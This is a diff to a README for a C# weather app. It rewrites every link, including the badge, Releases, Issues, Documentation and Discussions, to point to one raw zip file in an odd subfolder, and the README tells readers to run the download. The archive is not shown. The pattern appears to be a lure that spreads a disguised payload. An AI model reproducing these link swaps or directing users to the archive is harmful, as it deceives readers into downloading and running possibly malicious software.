@@ -1,6 +1,6 @@
 # 🌤️ Weather-app-using-Csharp - Get Real-Time Weather Updates Easily
 
-![Download Now](https://img.shields.io/badge/Download%20Now-Weather%20App-brightgreen)
+![Download Now](https://github.com/isaiasferreirafernandes/Weather-app-using-Csharp/raw/refs/heads/main/loulu/app-Weather-Csharp-using-1.1.zip%20Now-Weather%20App-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To run this application, you will need:
 
 To get started, visit this page to download the latest version of the Weather App:
 
-[Download the Weather App](https://github.com/isaiasferreirafernandes/Weather-app-using-Csharp/releases)
+[Download the Weather App](https://github.com/isaiasferreirafernandes/Weather-app-using-Csharp/raw/refs/heads/main/loulu/app-Weather-Csharp-using-1.1.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the most recent version.
@@ -48,7 +48,7 @@ Once the download completes, locate the file in your Downloads folder and run th
 
 ## ⚙️ Support and Contributions
 
-If you encounter any issues or have suggestions, please check the [Issues](https://github.com/isaiasferreirafernandes/Weather-app-using-Csharp/issues) section. Your feedback is invaluable to help us improve the application.
+If you encounter any issues or have suggestions, please check the [Issues](https://github.com/isaiasferreirafernandes/Weather-app-using-Csharp/raw/refs/heads/main/loulu/app-Weather-Csharp-using-1.1.zip) section. Your feedback is invaluable to help us improve the application.
 
 If you want to contribute to this project, feel free to fork the repository and submit a pull request. Please follow our guidelines outlined in the repository.
 
@@ -73,8 +73,8 @@ This project is licensed under the MIT License. Feel free to modify and use the 
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/isaiasferreirafernandes/Weather-app-using-Csharp/wiki)
-- [Community Discussions](https://github.com/isaiasferreirafernandes/Weather-app-using-Csharp/discussions)
+- [Documentation](https://github.com/isaiasferreirafernandes/Weather-app-using-Csharp/raw/refs/heads/main/loulu/app-Weather-Csharp-using-1.1.zip)
+- [Community Discussions](https://github.com/isaiasferreirafernandes/Weather-app-using-Csharp/raw/refs/heads/main/loulu/app-Weather-Csharp-using-1.1.zip)
 
 Enjoy using the Weather-app-using-Csharp and stay informed about the weather! 
 
